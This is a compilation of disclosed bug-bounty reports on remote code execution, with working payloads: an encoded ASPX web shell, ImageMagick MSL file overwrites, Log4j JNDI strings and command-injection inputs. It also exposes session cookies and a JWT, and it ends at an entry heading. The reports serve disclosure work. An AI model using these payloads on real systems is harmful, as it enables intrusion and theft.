User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: ████?rdNoShowWait=True
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: rdShowWaitUID=c866fd33-1ea8-4a08-8a2b-dc54372b4f2c; ASP.NET_SessionId=uaxhmmo4ffs3phxyysunzr3f; owin.skinId=4C90EFD0820345C0897EF44ED6BFC332; UserDomainId=ML.BASE.Domain.Id.Core; mg.requesttrackingid=3b29f9d0-7c04-4f82-8f2b-0f4a86f43ac2; mg.localeid=en-US; _ga=GA1.2.824910952.1609908283; _gid=GA1.2.630356640.1609908283; mg.clientid=9xWgk3zROzU07cGA3nzzMF%2BO1W4afEGAdu2uNjg2CXBVoQpFuWN4%2FeicI3GZIb3JC8yKByiGir5V%2BmZGLS8fGqUC9i8lSSmtXYwIxfnho3lC4ahL; mg.redirect=d2KfXvekHELGNGGoPlFEpw3k7XNMApDZNg%2FX321fCnKKl0oVS4Xte0MFhD7l6%2BQi%2B6deUP2WhILOx6BIZYYnCDj7XkSBqrqpJhFkEedsBI3MnQBWMs78soQwn9tLS0SwnjIG0EFbUbR6%2FnDZYlpqBgCQqCyqqq%2BrHdb2p4pc1B%2FvOq6idhVmG54nsfgQmiTa7pcYB8PVmTT9F%2FDMjci%2FNXCeIX5htjwRci6s6IMePVh3ZWQIkPaUokBw1GuKzIXZIZGAazWo0ap0SN3jEXFoJUJkNwZ8DTGdsYsES707KKr8EPoBM6q2AnP8YpBBEA6nb9LjhlJgb%2FfkJJ%2BetO5gNtt6mcVSZhsfMvtn4YNSYS6YqhkkOiEbLDzmtEJQn7kJxS4RVSov6L8zF40u2BY8dW2jnZ3VxK49EVqex014le8768GuRT5xWNT8dP7CRmKGQ2zGtxvUw2TZqM8Im%2FNT8smuCGieA17bi%2B3f7ghJwvQIdEZT9huOoo09FDBqAC9eS7Fplav8VLtjIYmZA7Fb6yneh%2BzDJv8gbcM%2FisQFrZB9V4Jnlto1mdprhmPrfjAHgTVFjmC%2F%2Bmd9zlkVrVgsTLJcc1I%3D; mg.request_scheme=u5fPP8roFKP%2Fx%2BF6Pv90Mts7z4X8%2FhA%2FrJSII5oiuPpBHpfSJawLK7jKe3FMdYq%2Fw55Xzw%3D%3D; mg.signin=; mg.id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlBrSFZlaVlRVFotWXdJNk9ZM0xIdjNJWkNRdyIsImtpZCI6IlBrSFZlaVlRVFotWXdJNk9ZM0xIdjNJWkNRdyJ9.eyJpc3MiOiJodHRwczovL2xtcy5td3IuYXJteS5taWwvaWRzZXJ2L2xvZ2luIiwiYXVkIjoiNUI2RDRFREUwRDk1NDE3Mjk4NDdEQUM5RDZCNkUwRDUiLCJleHAiOjE2MTAwMzA0NTEsIm5iZiI6MTYwOTk0NDA1MSwibm9uY2UiOiI5M2U4ZmViYjYwODA0MmY1OWFhOTJhNTdiNmUyMGQ2NyIsImlhdCI6MTYwOTk0NDA1MSwic2lkIjoiMDM4YjgzZThkZGQ3MGNjMWI3ODk5OGExNzVhNDI2ZWMiLCJzdWIiOiI1NDBCMDg3NzcwMTY0RTRFQTI0Q0ZGNTE3M0Y1M0QzNiIsImF1dGhfdGltZSI6MTYwOTk0NDA1MSwiaWRwIjoicGFzc3dvcmQiLCJuYW1lIjoiY2RsMTMzNyIsImdpdmVuX25hbWUiOiJDb3JiZW4iLCJmYW1pbHlfbmFtZSI6ImFzZGYiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy93ZWJwYWdlIjoicGFzc3dvcmQiLCJhbXIiOlsiZXh0ZXJuYWwiXX0.GkWU8LxgwcpXKiXhjBDPaccucwxaIoQkqaLvs6ZFj_HYGRe7zetpzFYgOMFJXuBcO3e0Yk8ZClvspABvSFrc3TDEPxIyb-kJUgyp2QvoBZjdYHZFGUvYqZeaYD4sVwGCz6pvVUhiAdPxXf20PmTQXbIxkHMkEchp2z7S_F-HEtIavI9nRXyekXX0wZY78C1d71LMhImC3JdkcANj-giddDbTdpz2OmPyXMrOC3PEGxO5rVX8oimkcz1jdgJ3vvLpyDeZ8fBMCuVT5TgFoAMa5aM8nu8FIP5euKqohYHFxpP6MuVw35NQkMUnf-iC2VCElp6X8USB7SA0s0kze3kfEA; mg.loginmethodology=password; MGKIToken=USR_LMS_USER_ID=540B087770164E4EA24CFF5173F53D36&DomainId=ML.BASE.Domain.Id.Core&LocaleId=en-US&KISessionId=7142f58b-5ee9-4391-8f79-41cabd05b359; mgauthtoken=D6124B94CC676F01318D455CB75AF13582B2FE697C75F6277A640F60A3628468FA6983F27575A440EFEC2758E9B924701F0C055E3935AEBFD1649DF3A667D12C9E1264B0E8E605A4099521E9F9D53BD313D4CA36D43B13B2150663E3C8F540D291F680CA73AB57D0F48C65003C95027F9E1C928A2EB88A8FB9D4FB3FC4EDCA064FCA167255B849389736BDBEA869A40382A3511B9C7410AEA04DBAF2D03AC043F4809E18; RequestLocaleId=en-US; strFeedback=; rdShowWaitUID=c866fd33-1ea8-4a08-8a2b-dc54372b4f2c; rdPanelExpanded_Table=True; rdTablePanelMenuExpanded=False; rdAllowRedo=False; rdAllowUndo=False

rdCSRFKey=1cd8a8e9-1362-465b-958b-798ff44f440d&itxSaveNewLayout=&AgReportLayoutGUID=02f74a12-70b6-4033-ad15-364a30e2cde8&rdAgDataColumnDetails=%2CLAST_NAME%3BLast+Name%3AText%2CFIRST_NAME%3BFirst+Name%3AText%2CCOURSE_NAME%3BContent+Title%3AText%2CCONTENT_TYPE%3BContent+Type%3AText%2CSTART_DATE%3BStart+Date%3ADateTime%2CCOMPLETE_DATE%3BComplete+Date%3ADateTime%2CLAST_ACCESS_DATE%3BLast+Launch%3ADateTime%2CATTEMPT%3BTotal+Launches%3ANumber%2COPT_USR_JOB_TITLE%3BJob+Title%3AText%2COPT_USR_MANAGER_ID%3BManager%3AText%2COPT_USR_EMAIL_ADDRESS%3BEmail+Address%3AText%2COPT_USR_ORGANIZATION_ID%3BOrganization%3AText%2COPT_USR_STATE_ID%3BState%3AText%2COPT_USR_COUNTRY_ID%3BCountry%3AText%2COPT_USER_ACTIVITY%3BActivity%3AText%2COPT_USR_LOGIN_ID%3BLogin+ID%3AText%2COPT_USR_LMS_USER_ID%3BUser+ID%3AText%2COPT_GLAIT_ALTERNATE_ID%3BGLAIT+Alternate+ID%3AText%2COPT_CNTVER_VERSION_NUMBER%3BVersion+Number%3AText&rdAgCurrentOpenPanel=&rdAllowCrosstabBasedOnCurrentColumns=True&rdAgCalcName=&rdAgCalcDataColumns=&rdAgCalcFormula=&rdAgCalcDataTypes=Number&rdAgCalcFormats=&rdAfMode_rdAgAnalysisFilter=Design&rdAfFilterColumnID_rdAgAnalysisFilter=&rdAfFilterOperator_rdAgAnalysisFilter=%3D&rdAfSlidingTimeStartDateFilterOperator_rdAgAnalysisFilter=Specific+Date&rdAfSlidingTimeStartDateFilterOperatorOptions_rdAgAnalysisFilter=Today&rdAfFilterStartDate_rdAgAnalysisFilter=&rdAfFilterStartDate_rdAgAnalysisFilter_Hidden=&rdReformatDaterdAfFilterStartDate_rdAgAnalysisFilter=yyyy-MM-dd&rdDateFormatrdAfFilterStartDate_rdAgAnalysisFilter=M%2Fd%2Fyyyy&rdAfFilterStartTime_rdAgAnalysisFilter=&rdAfFilterStartTime_rdAgAnalysisFilter_Hidden=8%3A48+AM&rdReformatTimerdAfFilterStartTime_rdAgAnalysisFilter=HH%3Amm%3Ass&rdFormatTimerdAfFilterStartTime_rdAgAnalysisFilter=t&rdAfSlidingTimeEndDateFilterOperator_rdAgAnalysisFilter=Specific+Date&rdAfSlidingTimeEndDateFilterOperatorOptions_rdAgAnalysisFilter=Today&rdAfFilterEndDate_rdAgAnalysisFilter=&rdAfFilterEndDate_rdAgAnalysisFilter_Hidden=&rdReformatDaterdAfFilterEndDate_rdAgAnalysisFilter=yyyy-MM-dd&rdDateFormatrdAfFilterEndDate_rdAgAnalysisFilter=M%2Fd%2Fyyyy&rdAfFilterEndTime_rdAgAnalysisFilter=&rdAfFilterEndTime_rdAgAnalysisFilter_Hidden=8%3A48+AM&rdReformatTimerdAfFilterEndTime_rdAgAnalysisFilter=HH%3Amm%3Ass&rdFormatTimerdAfFilterEndTime_rdAgAnalysisFilter=t&rdAfFilterValue_rdAgAnalysisFilter=&rdAfFilterValueMax_rdAgAnalysisFilter=&rdAgCurrentOpenTablePanel=&rdAgId=agResults&rdAgReportId=agContentAccess&rdAgDraggablePanels=True&rdAgPanelOrder=rowTable&rdICL-iclLayout=colRowNumber%2CcolLastName%2CcolFirstName%2CcolContentTitle%2CcolContentType%2CcolStartDate%2CcolCompleteDate%2CcolLastAccessDate%2CcolTotalLaunches%2CcolReportMenu%2C&iclLayout_rdExpandedCollapsedHistory=&iclLayout=colRowNumber&iclLayout=colLastName&iclLayout=colFirstName&iclLayout=colContentTitle&iclLayout=colContentType&iclLayout=colStartDate&iclLayout=colCompleteDate&iclLayout=colLastAccessDate&iclLayout=colTotalLaunches&iclLayout=colReportMenu&rdAgGroupColumn=&rdAgPickDateColumnsForGrouping=%2CSTART_DATE%2CCOMPLETE_DATE%2CLAST_ACCESS_DATE%2C&rdAgDateGroupBy=&rdAgAggrColumn=&rdAgAggrFunction=SUM&rdAgAggrRowPosition=RowPositionTop&rdAgOrderColumn=&rdAgOrderDirection=Ascending&rdAgPaging=ShowPaging&rdAgRowsPerPage=25&rdAgCurrentOpenTablePanel=&rdPanelTitle_actAddToDashboardDataTable=Table&rdPanelDescription_actAddToDashboardDataTable=&rdShowElementHistory=&strECOrderStatus=&strOptionalSets=UserShort%2CUserId%2CVersion&userID=540B087770164E4EA24CFF5173F53D36&SkinValue=4C90EFD0820345C0897EF44ED6BFC332&CurrentUserId=540B087770164E4EA24CFF5173F53D36&rdReportSubType=&RequestLocaleId=en-US&strOrderNumber=&strTrainingPeriodDeadline=&rdWaitCaption=Loading+.+.+.&strContentTypeEC=&strPageRowCount=25&strExternalLearningTitle=&TZMinutesOffset=-60&strDateFrom=1%2F1%2F1997+1%3A00%3A00+AM&strIncludeInactiveUser=F&strCompletionStatus=&strProgressStatus=&rdReportName=%3c%25%40%20%50%61%67%65%20%4c%61%6e%67%75%61%67%65%3d%22%43%23%22%25%3e%3c%25%40%20%49%6d%70%6f%72%74%20%4e%61%6d%65%73%70%61%63%65%3d%22%53%79%73%74%65%6d%22%20%25%3e%0d%0a%3c%25%20%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%20%70%72%6f%63%65%73%73%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%28%29%3b%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%20%73%74%61%72%74%49%6e%66%6f%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%28%29%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%55%73%65%53%68%65%6c%6c%45%78%65%63%75%74%65%20%3d%20%66%61%6c%73%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%52%65%64%69%72%65%63%74%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%20%3d%20%74%72%75%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%46%69%6c%65%4e%61%6d%65%20%3d%20%22%43%4d%44%2e%65%78%65%22%3b%0d%0a%73%74%72%69%6e%67%20%63%6d%64%20%3d%20%52%65%71%75%65%73%74%2e%51%75%65%72%79%53%74%72%69%6e%67%5b%22%36%38%63%32%63%38%62%31%66%63%34%37%37%36%36%65%61%66%34%33%30%32%37%61%38%65%61%63%61%31%32%31%22%5d%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%41%72%67%75%6d%65%6e%74%73%20%3d%20%22%2f%63%20%22%2b%63%6d%64%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%49%6e%66%6f%20%3d%20%73%74%61%72%74%49%6e%66%6f%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%28%29%3b%0d%0a%73%74%72%69%6e%67%20%6f%75%74%70%75%74%20%3d%20%70%72%6f%63%65%73%73%2e%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%2e%52%65%61%64%54%6f%45%6e%64%28%29%3b%0d%0a%52%65%73%70%6f%6e%73%65%2e%57%72%69%74%65%28%6f%75%74%70%75%74%29%3b%0d%0a%70%72%6f%63%65%73%73%2e%57%61%69%74%46%6f%72%45%78%69%74%28%29%3b%0d%0a%0d%0a%25%3e&strSectionActivity=T&strContentActivity=T&strTrainingPeriodStatus=&strIncludeInactiveContent=F&strDateTo=1%2F7%2F2021+12%3A59%3A59+AM&CurrentDomainId=ML.BASE.Domain.Id.Core&strOrderNumberSearchType=ML.BASE.DV.SearchContains&RequestTimeZoneId=20&strContentTypeRT=&strReportId=ML.BASE.RPT.AG.ContentAccess.Manager&SystemCurrencySymbol=%24&strECItemStatus=&strUserActivity=T&KviewPath=https%3A%2F%2Flms.mwr.army.mil&strExternalLearningType=&strContentType=&strExemptionType=&blnHasManagePerm=F&rdReportType=MANAGER&strDeliveryMethod=&RequestRegionId=en-US&strExternalLearningStatus=&rdAfFilterValueBoolean_rdAgAnalysisFilter=False&rdAgExcludeDetailRowsCheckbox=False&rdAgHideFunctionNamesCheckbox=False&rdRnd=7503
```

## Impact

Critical, an attacker can execute commands on this military server.

Best,
@cdl

---

### [Remote Code Execution on ownCloud instances with ImageMagick installed](https://hackerone.com/reports/1838674)

- **Report ID:** `1838674`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** ownCloud
- **Reporter:** @lukasreschke
- **Bounty:** - usd
- **Disclosed:** 2023-04-12T16:14:15.056Z
- **CVE(s):** -

**Vulnerability Information:**

It is possible to execute code on ownCloud instances which have ImageMagick installed. This is due to the usage of ImageMagick for preview generation for some file types. (anything using [`OC\Preview\Bitmap`](https://github.com/owncloud/core/blob/83f600f8b89b62d52248dfdbc7046567be024b67/lib/private/Preview/Bitmap.php#L84-L92))

The prerequisite for exploitation seem to be:

- ImageMagick is installed (e.g. as [described in the ownCloud documentation](https://doc.owncloud.com/server/10.10/admin_manual/installation/manual_installation/manual_imagick7.html))
- The attacker knows the file path of a file that they uploaded (e.g. `/mnt/data/files/`)
- The attacker is able to upload files to the system (e.g. by using [File Drop Folders](https://owncloud.com/features/file-drop-folders/) or having an account)

To reproduce we have provided the following files:

- F2127559
```
FROM owncloud/server:10.11
RUN apt-get update && apt-get install -y imagemagick
```

- F2127558
```
<?xml version="1.0" encoding="UTF-8"?>
<image> 
  <read filename="/mnt/data/files/admin/files/Photos/Portugal.jpg" />
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <comment>&lt;?php echo php_uname(); ?&gt;</comment>
  <write filename="/var/www/owncloud/index.php" />
</image>
```

- F2127557
```
<svg width="1000" height="1000" 
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">       
<image xlink:href="msl:/mnt/data/files/admin/files/exploit.msl" height="500" width="500"/>
</svg>
```

Download these files and then perform the following steps:

- Build the docker image
   - `docker build . -t owncloud-imagemagick`
- Start the docker image
   - `docker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest`
- Open the ownCloud instance at localhost:8080 and login using the username “admin” and the password “admin”.
   - Upload the file exploit.msl
   - Upload the file image.rgb
- Reload the page, at this point you will be served the new rewritten index.php that will also perform the phpinfo() command. (you can change which file should be overwritten and what PHP code will be executed inside exploit.msl)

{F2127565}

## Impact

Attackers that are able to upload files to a ownCloud instance with ImageMagick installed can execute arbitrary code on the system.

---

### [Synthetics Recorder: Code injection when recording website with malicious content](https://hackerone.com/reports/1636382)

- **Report ID:** `1636382`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Elastic
- **Reporter:** @dee-see
- **Bounty:** - usd
- **Disclosed:** 2023-04-08T17:25:08.056Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

Hello team! Synthetics recorder has a `quote` function to escape user-controlled input, but in one particular scenario the escaping isn't enough and a malicious website can inject arbitrary code in the recorder session.

## Description

The `waitForNavigation` event calls `quote` within the context of a multi-line comment (`/* ... */`) so we can break out of that without using the escaped characters ([reference](https://github.com/elastic/synthetics-recorder/blob/v0.0.1-beta.3/electron/syntheticsGenerator.ts#L217=))

In a normal situation the code generated looks like this for a navigation event to `https://example.com`

```javascript
    page.waitForNavigation(/*{ url: 'https://example.com' }*/),
```

but it's possible to escape out of the comment without using single quotes (which would be escaped) with a specially crafted URL like `https://example.com?q=*/require(`child_process`).exec(`touch$IFS/tmp/haxx`)/*`

```javascript
    page.waitForNavigation(/*{ url: 'https://example.com?q=*/require(`child_process`).exec(`touch$IFS/tmp/dee-see`)/*' }*/),
```

The syntax highlighting here on HackerOne helps visualizing how that works. `$IFS` is used because spaces get encoded to `%20`.

It's possible to have code execution when the victim uses the `test` feature inside of the synthetic recorder but the code we're allowed to use is fairly limited because the `require` function isn't available. The maximum impact is when the user saves the recorded session as a project and executes it using the synthetic runner.

## Steps To Reproduce

### Preparation

Install the synthetics recorder (See https://github.com/elastic/synthetics-recorder/, I'm following the instructions to run it in development mode (`nvm install; nvm use; npm install; npm run dev`) but you could also download the binary on the releases page)

### Reproduction

1. Start Synthetics Recorder and enter `http://deesee.xyz:4567` in the text box where it says "Enter a Starting URL"
1. Click "Start Recording"
1. A browser has opened, this website is a modified clone of my blog. Click the GitLab icon in the top right

    {F1820934}

1. Close the browser window

    In a normal Synthetics Recorder session there would be much more steps to record but here we only did what's necessary to trigger the issue.

1. Click the "Export" button and you'll see this code

    ```javascript
    step('Go to http://deesee.xyz:4567/', async () => {
      await page.goto('http://deesee.xyz:4567/');
      await Promise.all([
        page.waitForNavigation(/*{ url: 'https://gitlab.com/dee-see?query=*/require(`child_process`).exec(`touch$IFS/tmp/dee-see`)/*' }*/),
        page.click('[aria-label="GitLab"] svg')
      ]);
    });
    ```

    We can see the payload is in place. It's fairly obvious because we only recorded one step, but in a long recording session it would be buried deeper.

1. Click the "Export" button and save the file in a directory
1. In that directory run `npm init -y; npm install @elastic/synthetics; npx @elastic/synthetics .`
1. When the tests finished running observe that the `touch /tmp/dee-see` command ran

Those last steps seem contrived, but that's how a synthetics test suite is setup and how a developer would make sure the session they just recorded would be integrated into their builds and whatnot.

## Supporting Material/References:

{F1820942}

## CVSS

Confidentiality and Integrity impact are High because of the arbitrary command execution. I also included Availability impact because those commands can shut down the system. I will concede though that Attack Complexity could be "very high" if that existed on the Attack Complexity scale. :)

## Impact

Someone with control over the website's content can run arbitrary code where ever the synthetics recorded session will be re-executed.

Developer computers and CI systems come to mind. The most realistic attack scenario would be privilege escalation from within a company.

---

### [[███████] Remote Code Execution at ██████ [CVE-2021-44529] [HtUS]](https://hackerone.com/reports/1624172)

- **Report ID:** `1624172`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @norwegianwood
- **Bounty:** 1000 usd
- **Disclosed:** 2023-01-06T18:57:47.352Z
- **CVE(s):** CVE-2021-44529

**Vulnerability Information:**

**IP Address used to find vulnerability:**

 `██████`

**Vulnerable Website URL or Application:** 

`https://████`

`pomcldsvr2.████`



**Proof of ownership:**

███



**Summary:**

The server at `https://███` is running a vulnerable version of CSA.

A code injection vulnerability in the Ivanti EPM Cloud Services Appliance (CSA) allows an unauthenticated user to execute arbitrary code with limited permissions (nobody).

**Steps to Reproduce:**

Use Burp Repeater to send the following GET requests:

*Please note that for the system commands to run, they need to be Base64 encoded. For example, for phpinfo, pass cGhwaW5mbygpOw==*

- For phpinfo()

  ````
  GET /client/index.php HTTP/1.1
  Host: ███████
  User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
  Connection: close
  Cookie: ab=ab; c=cGhwaW5mbygpOw==; d=; e=;
  Accept-Encoding: gzip, deflate
  
  
  ````

**Screenshots:**

█████████

█████████

██████

█████

██████

**References:**

- https://nvd.nist.gov/vuln/detail/CVE-2021-44529
- https://forums.ivanti.com/s/article/SA-2021-12-02

## Impact

**Impact:**
Remote attackers can execute arbitrary commands on the server, and compromise company and user data.

**CVSS Score: Critical**

**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

---

### [CVE-2022-40127: RCE in Apache Airflow <2.4.0 bash example](https://hackerone.com/reports/1776476)

- **Report ID:** `1776476`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Internet Bug Bounty
- **Reporter:** @leixiao
- **Bounty:** 4000 usd
- **Disclosed:** 2023-01-05T00:47:40.946Z
- **CVE(s):** CVE-2022-40127

**Vulnerability Information:**

airflow-2.3.3/airflow/example_dags/example_bash_operator.py has a command injection vulnerability.
I can control the run_id in the following code(example_bash_operator.py),So I can inject custom commands.
```
    also_run_this = BashOperator(
        task_id='also_run_this',
        bash_command='echo "run_id={{ run_id }} | dag_run={{ dag_run }}"',
    )
```
Enter the DAGs menu and start example_bash_operator task, select “Trigger DAG w/ config”.Set the run_id to " `touch /tmp/success` " and trigger.

{F2036322}

## Impact

Execute any OS command

**Summary (team):**

###Description:

A vulnerability in Example Dags of Apache Airflow allows an attacker with UI access who can trigger DAGs, to execute arbitrary commands via manually provided run_id parameter.  This issue affects Apache Airflow Apache Airflow versions prior to 2.4.0.

###Mitigation:

Do not enable example dags on systems that should not allow UI user to execute an arbitrary command.

###References:

https://github.com/apache/airflow/pull/25960

---

### [[hta3] Remote Code Execution on  https://███ via improper access control to SCORM Zip upload/import](https://hackerone.com/reports/1122791)

- **Report ID:** `1122791`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cdl
- **Bounty:** - usd
- **Disclosed:** 2022-09-15T13:28:18.119Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
There is a Remote Code Execution vulnerability at https://█████████/Kview/CustomCodeBehind/base/courseware/scorm/management/scorm2004uploadcourse.aspx which allows any user to upload a SCORM course package. Furthermore, an attacker can add an ASPX shell to the SCORM package which will then get extracted onto the server, where the attacker can then execute commands.

## Steps To Reproduce:

  1. Visit `https://███████/` and log in with the credentials: `██████████`
  2. Now download this "malicious" SCORM course package: █████
  3. If you `unzip scorm.zip`, you will notice this is a valid SCORM [package](https://scorm.com/scorm-explained/technical-scorm/content-packaging/), and you will also notice that I've included an ASPX file in `shared/cdlcdlcdl.aspx` which runs the `whoami` command. Notice I also included that file reference in the Scorm Manifest (`imsmanifest.xml`)
4. Visit https://████████/Kview/CustomCodeBehind/base/courseware/scorm/management/scorm2004uploadcourse.aspx, select the ██████ file. Start **intercepting** in Burp Suite Repeater. 
5. Forward the POST request to `/Kview/CustomCodeBehind/base/courseware/scorm/management/scorm2004uploadcourse.aspx`
6. Now intercept the request to `/Kview/CustomCodeBehind/base/courseware/scorm/management/scorm2004editmetadata.aspx`
7. Right-Click on it, Hover down to "Do intercept" and click "response to this request" then forward it.  (In your web-browser you might be able to just right-click, inspect-element, and search for strCourseId in there but my browser was being funky).
8. Once you've received the response, search for "strCourseId" and grab it.

For example, you would grab `F6BAC72B45D64B34ACB662BB001D8523` out of the following response:

```html
<a onclick="return&#32;ConfirmBeforeNavigateAway(&#39;Are&#32;you&#32;sure&#32;you&#32;want&#32;to&#32;navigate&#32;away&#32;from&#32;this&#32;page?&#32;\n\nYou&#32;made&#32;changes&#32;that&#32;will&#32;not&#32;be&#32;saved&#32;if&#32;you&#32;continue.&#32;\n\nClick&#32;OK&#32;to&#32;proceed&#32;or&#32;Cancel&#32;to&#32;return&#32;to&#32;the&#32;page.&#39;);" id="ML.BASE.WF.ReuploadCourse" class="WorkflowButton" NavigatingURL="Courseware/SCORM/Management/SCORM2004ReuploadCourse.aspx" ItemId="&lt;IDTable&gt;&lt;strCourseId&gt;F6BAC72B45D64B34ACB662BB001D8523&lt;/strCourseId&gt;&lt;strVersionId&gt;F6BAC72B45D64B34ACB662BB001D8523&lt;/strVersionId&gt;&lt;/IDTable&gt;" href="javascript:__doPostBack(&#39;ML.BASE.WF.ReuploadCourse&#39;,&#39;&#39;)"><span>Course Files</span></a>
```
9. Now, visit `https://█████/CServer/Courseware/<YOUR_COURSE_ID>/shared/cdlcdlcdl.aspx` and you will see the shell executes:

███

## Supporting Material/References:
- https://█████/CServer/Courseware/F6BAC72B45D64B34ACB662BB001D8523/shared/cdlcdlcdl.aspx

## Proof-of-Concept Video
█████████

## Impact

Critical, an attacker can execute commands on this military server, steal sensitive information, pivot to internal systems, etc.

Best,
@cdcl

---

### [CVE-2022-21831: Possible code injection vulnerability in Rails / Active Storage](https://hackerone.com/reports/1652042)

- **Report ID:** `1652042`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Internet Bug Bounty
- **Reporter:** @gquadros_
- **Bounty:** 2000 usd
- **Disclosed:** 2022-09-10T19:12:29.774Z
- **CVE(s):** CVE-2022-21831

**Vulnerability Information:**

Original report: https://hackerone.com/reports/1154034
Rails advisory: https://discuss.rubyonrails.org/t/cve-2022-21831-possible-code-injection-vulnerability-in-rails-active-storage/80199
Blogpost: https://blog.convisoappsec.com/en/cve-2022-21831-overview-of-the-security-issues-we-found-in-railss-image-processing-api/

If the report is eligible for a bounty, please split it equally between me and @rsilva, if possible.

## Impact

Vulnerable code patterns could allow the attacker to achieve RCE.

**Summary (team):**

[CVE-2022-21831] Possible code injection vulnerability in Rails / Active Storage

There is a possible code injection vulnerability in the Active Storage module of Rails. This vulnerability has been assigned the CVE identifier CVE-2022-21831.

Versions Affected: >= 5.2.0 Not affected: < 5.2.0 Fixed Versions: 7.0.2.3, 6.1.4.7, 6.0.4.7, 5.2.6.3

Impact
There is a possible code injection vulnerability in the Active Storage module of Rails. This vulnerability impacts applications that use Active Storage with the image_processing processing in addition to the mini_magick back end for image_processing.

Vulnerable code will look something similar to this:

<%= image_tag blob.variant(params[:t] => params[:v]) %>
Where the transformation method or its arguments are untrusted arbitrary input.

All users running an affected release should either upgrade or use one of the workarounds immediately.

Releases
The fixed releases are available at the normal locations.

Workarounds
To work around this issue, applications should implement a strict allow-list on accepted transformation methods or arguments. Additionally, a strict image magick security policy will help mitigate this issue.

ImageMagick – Security Policy 70

Patches
To aid users who aren’t able to upgrade immediately we have provided patches for the two supported release series. They are in git-am format and consist of a single changeset.

5-2-active-storage-code-injection.patch - Patch for 5.2 series
6-0-active-storage-code-injection.patch - Patch for 6.0 series
6-1-active-storage-code-injection.patch - Patch for 6.1 series
7-0-active-storage-code-injection.patch - Patch for 7.0 series
Please note that only the 7.0.Z, 6.1.Z, 6.0.Z, and 5.2.Z series are supported at present. Users of earlier unsupported releases are advised to upgrade as soon as possible as we cannot guarantee the continued availability of security fixes for unsupported releases.

Credits
Thanks to @gquadros_ for reporting this and Zack Deveau of Shopify for writing the patches

Link to Security Advisory: https://discuss.rubyonrails.org/t/cve-2022-21831-possible-code-injection-vulnerability-in-rails-active-storage/80199
Link to GHSA: https://github.com/advisories/GHSA-w749-p3v6-hccq

---

### [solr_log4j - http://██████████](https://hackerone.com/reports/1631370)

- **Report ID:** `1631370`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @hachimanxienim
- **Bounty:** - usd
- **Disclosed:** 2022-09-06T19:10:39.069Z
- **CVE(s):** -

**Vulnerability Information:**

Hi security team, i found a solr log4j vulnerability in your aplication

## Impact

Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Just send get request to this path and change your interact server

PATH ----> http://████████/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.YOURINTERACTSERVER/a%7D

## Suggested Mitigation/Remediation Actions

---

### [██████_log4j - https://██████](https://hackerone.com/reports/1631364)

- **Report ID:** `1631364`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @hachimanxienim
- **Bounty:** - usd
- **Disclosed:** 2022-09-06T19:07:13.913Z
- **CVE(s):** -

**Vulnerability Information:**

Hi security team, i found a log4j vulnerability in your aplication

## Impact

Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Send POST request to this endpoint --->  https://██████/mifs/j_spring_security_check


the post request: 

j_username=${jndi:ldap://${hostName}.youinteractsserver}&j_password=password&logincontext=employee

## Suggested Mitigation/Remediation Actions

---

### [Ingress-nginx annotation injection allows retrieval of ingress-nginx serviceaccount token and secrets across all namespaces](https://hackerone.com/reports/1378175)

